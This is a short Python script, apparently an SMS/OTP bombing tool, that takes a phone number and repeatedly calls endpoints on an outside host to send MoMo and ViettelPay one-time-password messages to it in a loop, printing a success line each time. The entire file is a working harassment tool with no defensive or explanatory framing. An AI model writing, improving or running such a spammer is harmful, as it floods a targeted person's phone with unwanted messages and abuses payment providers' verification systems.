import requests, time
from time import sleep

phone = input("Input Phone: ")
while True:
   main = requests.get("https://danganhduy.io/login-momo.php?phone="+str(phone)).json()
   if main == 0:
       print ("Spam so nay an lon a?")
       sleep(5)
       break
   else:
       main2 = requests.get("https://danganhduy.io/login-vtpay.php?phone="+str(phone))
       print ("SEND OTP MOMO SUCCESS: "+phone)
       print ("SEND OTP VTPAY SUCCESS: "+phone)
       sleep(10)